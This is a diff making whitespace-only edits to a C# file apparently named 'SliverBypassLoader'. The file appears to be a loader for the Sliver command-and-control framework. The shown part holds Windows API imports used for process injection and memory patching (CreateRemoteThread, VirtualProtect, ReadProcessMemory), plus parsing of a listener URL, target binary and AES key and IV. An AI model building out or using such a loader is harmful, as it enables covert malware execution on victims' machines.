@@ -120,19 +120,19 @@ namespace SliverBypassLoader
         [DllImport("kernel32.dll")]
         static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
-        [DllImport("kernel32.dll", SetLastError = true)] 
+        [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
 
-        [DllImport("kernel32.dll", SetLastError = true)] 
+        [DllImport("kernel32.dll", SetLastError = true)]
         public static extern IntPtr GetCurrentProcess();
 
         [DllImport("kernel32")]
         public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
-        [DllImport("kernel32")] 
+        [DllImport("kernel32")]
         public static extern IntPtr LoadLibrary(string name);
 
-        [DllImport("kernel32")] 
+        [DllImport("kernel32")]
         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
         [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
@@ -157,12 +157,12 @@ namespace SliverBypassLoader
         {
             // Parse args
             string listenerUrl = "", compressAlgorithm = "", targetBinary = "", aesKey = "", aesIv = "";
-            if (args != null && 
-                args.Length > 0 && 
-                !string.IsNullOrEmpty(args[0]) && 
-                !string.IsNullOrEmpty(args[1]) && 
-                !string.IsNullOrEmpty(args[2]) && 
-                !string.IsNullOrEmpty(args[3]) && 
+            if (args != null &&
+                args.Length > 0 &&
+                !string.IsNullOrEmpty(args[0]) &&
+                !string.IsNullOrEmpty(args[1]) &&
+                !string.IsNullOrEmpty(args[2]) &&
+                !string.IsNullOrEmpty(args[3]) &&
                 !string.IsNullOrEmpty(args[4]))
             {
                 listenerUrl = args[0];
